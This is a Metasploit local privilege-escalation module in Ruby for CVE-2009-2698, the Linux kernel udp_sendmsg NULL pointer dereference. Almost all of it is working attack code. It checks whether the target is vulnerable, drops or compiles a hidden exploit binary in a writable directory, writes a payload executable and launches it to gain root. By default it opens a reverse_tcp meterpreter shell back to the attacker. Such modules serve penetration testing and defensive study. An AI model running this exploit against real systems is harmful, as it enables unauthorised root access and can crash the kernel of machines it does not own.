##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Compile
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Kernel udp_sendmsg() MSG_MORE ip_append_data() NULL Pointer Dereference Privilege Escalation',
        'Description' => %q{
          This module exploits a NULL pointer dereference in the `udp_sendmsg()`
          function in Linux kernels 2.6.0 <= 2.6.18.8 to gain root privileges.

          The `udp_sendmsg()` routing table pointer `struct rtable *rt` is
          initialized as NULL. Sending a message to a UDP socket with the
          `MSG_MORE` flag instructs the kernel that more data is pending,
          which leads to calling `ip_append_data()` with the NULL rt,
          resulting in execution of arbitrary code mapped at page zero.

          Failed exploitation may crash the kernel.

          Mapping page zero is forbidden on systems with an effective
          `vm.mmap_min_addr` or configured with the UDEREF feature of
          PaX/GrSecurity, preventing exploitation.

          This module has been tested successfully on:

          CentOS 4.4 Server (x86_64) kernel 2.6.9-42.EL;
          Debian 4.0r0 (i386) kernel 2.6.18-4-686; and
          Debian 4.0r7 (x86_64) kernel 2.6.18-6-amd64.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Tavis Ormandy', # Discovery and trigger PoC
            'Julien Tinnes', # Discovery and trigger PoC
            'p0c73n1', # exploit (x86)
            'spender', # therebel C exploit (x86/x86_64)
            'bcoles', # Metasploit module
          ],
        'DisclosureDate' => '2009-08-25',
        'Platform' => ['linux'],
        'Arch' => [ARCH_X86, ARCH_X64],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' =>
          [
            ['CVE', '2009-2698'],
            ['CWE', '476'],
            ['BID', '36108'],
            ['EDB', '9542'],
            ['EDB', '9574'],
            ['URL', 'https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html'],
            ['URL', 'https://www.securitytracker.com/id?1022761'],
            ['URL', 'https://security-tracker.debian.org/tracker/CVE-2009-2698'],
            ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2009-2698'],
            ['URL', 'https://git.kernel.org/linus/1e0c14f49d6b393179f423abbac47f85618d3d46'],
            ['URL', 'https://www.openwall.com/lists/oss-security/2009/08/25/1'],
          ],
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
        },
        'Notes' =>
          {
            'AKA' => ['udp_sendmsg', 'therebel'],
            'Reliability' => [ REPEATABLE_SESSION ],
            'Stability' => [ CRASH_OS_DOWN ]
          },
        'DefaultTarget' => 0
      )
    )
    register_advanced_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ])
    ])
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    version = Gem::Version.new(kernel_release.split('-').first)

    unless version
      return CheckCode::Unknown('Could not determine the kernel version.')
    end

    # https://www.man7.org/linux/man-pages/man2/send.2.html
    unless version.between?(Gem::Version.new('2.6.0'), Gem::Version.new('2.6.18.8'))
      return CheckCode::Safe("Kernel version #{version} is not vulnerable.")
    end

    vprint_good "Kernel version #{version} appears to be vulnerable"

    arch = kernel_hardware

    unless arch.include?('x86_64') || arch =~ /i\d86/
      return CheckCode::Safe("System architecture #{arch} is not supported.")
    end

    vprint_good("System architecture #{arch} is supported")

    min_addr = mmap_min_addr

    unless min_addr == 0
      return CheckCode::Safe("vm.mmap_min_addr (#{min_addr}) does not permit mapping NULL page.")
    end

    vprint_good('vm.mmap_min_addr allows mapping NULL page')

    if grsec_installed?
      return CheckCode::Safe('grsecurity is in use')
    end

    vprint_good('grsecurity is not in use')

    CheckCode::Appears
  end

  def exploit
    if is_root? && !datastore['ForceExploit']
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    exploit_path = "#{base_dir}/.#{rand_text_alphanumeric(8..12)}"

    if live_compile?
      vprint_status('Live compiling exploit on system...')
      upload_and_compile(exploit_path, strip_comments(exploit_data('CVE-2009-2698', 'exploit.c')))
    else
      vprint_status('Dropping pre-compiled exploit on system...')
      arch = kernel_hardware
      case arch
      when /amd64|x86_64|x64/i
        write_file(exploit_path, exploit_data('CVE-2009-2698', 'udp_sendpage.x86_64'))
        cmd_exec("chmod +x '#{exploit_path}'")
      when /x86|i\d86/
        write_file(exploit_path, exploit_data('CVE-2009-2698', 'udp_sendpage.x86'))
        cmd_exec("chmod +x '#{exploit_path}'")
      else
        fail_with(Failure::NoTarget, "No pre-compiled binaries are available for this system architecture (#{arch})")
      end
    end
    register_file_for_cleanup(exploit_path)

    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(8..12)}"
    write_file(payload_path, generate_payload_exe)
    cmd_exec("chmod +x '#{payload_path}'")
    register_file_for_cleanup(payload_path)

    print_status('Launching exploit ...')
    output = cmd_exec("echo '#{payload_path} & exit' | #{exploit_path}")
    output.each_line { |line| vprint_status line.chomp }
  end
end
